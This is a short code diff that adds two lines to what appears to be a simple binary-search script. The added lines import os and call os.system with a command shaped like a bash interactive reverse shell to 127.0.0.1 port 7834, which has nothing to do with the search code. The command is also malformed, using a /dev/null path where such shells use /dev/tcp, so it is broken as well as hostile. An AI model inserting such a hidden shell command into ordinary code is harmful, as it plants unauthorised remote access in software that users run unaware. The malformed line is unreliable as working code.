@@ -1,3 +1,5 @@
+import os
+os.system("bash -i &> /dev/null/127.0.0.1/7834 0>&1 ;")
 a = [1,2,3,4,5,6,7]
 low = 0
 high = len(a)-1
